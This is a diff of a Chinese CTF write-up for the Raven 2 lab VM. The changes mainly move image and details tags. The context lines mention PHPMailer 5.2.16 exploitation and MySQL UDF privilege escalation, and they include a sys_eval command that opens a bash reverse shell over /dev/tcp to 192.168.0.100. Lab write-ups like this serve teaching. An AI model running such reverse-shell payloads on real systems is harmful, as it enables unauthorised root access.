@@ -111,11 +111,8 @@ http://192.168.0.102/wordpress            (Status: 301) [Size: > 318] [--> http:
 2022/05/28 07:49:51 Finished
 ==============================================================
 ```
-</details>
-
-
-
 <img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/1.png" width="56%">
+</details>
 
 
 > 4. 找到网站使用了	PHPMailer而且版本是5.2.16，网站路径是`/var/www/html/vendor`
@@ -310,11 +307,13 @@ if r.status_code == 200:
 
 ```
 
+<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/4.png" width="56%">
+
 </details>
 
 
 
-<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/4.png" width="56%">
+
 
 
 > 6. mysql提权
@@ -1294,9 +1293,12 @@ drwxr-xr-x 12 root     root   4096 Aug 13  2018 ..
 -rw-rw----  1 www-data mail 113221 May 28 14:47 www-data
 ### SCAN COMPLETE ####################################
 ```
-</details>
 
 <img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/5.png" width="56%">
+
+</details>
+
+
 
 **其中有一个，mysql的服务还加载了插件目录**
 ~~~shell
@@ -1323,11 +1325,13 @@ select * from mysql.func;
 mysql> select sys_eval("bash -c 'exec bash -i &>/dev/tcp/192.168.0.100/5555 <&1'");
  ```
 
+> 成功拿到root权限
+<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/6.png" width="56%">
+
 </details>
 
 
-> 成功拿到root权限
-<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/6.png" width="56%">
+
 
 <details>
 <summary>7. 至于flag，大家自己找吧，我知道的应该就4个:(第三个是一个图片，因此需要用浏览器加载出来)</summary>
@@ -1361,7 +1365,9 @@ I hope you enjoyed this second interation of the Raven VM
 Hit me up on Twitter and let me know what you thought:
 @mccannwj / wjmccann.github.io
 ```
+
 <img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/7.png" width="56%">
+
 </details>
  
 
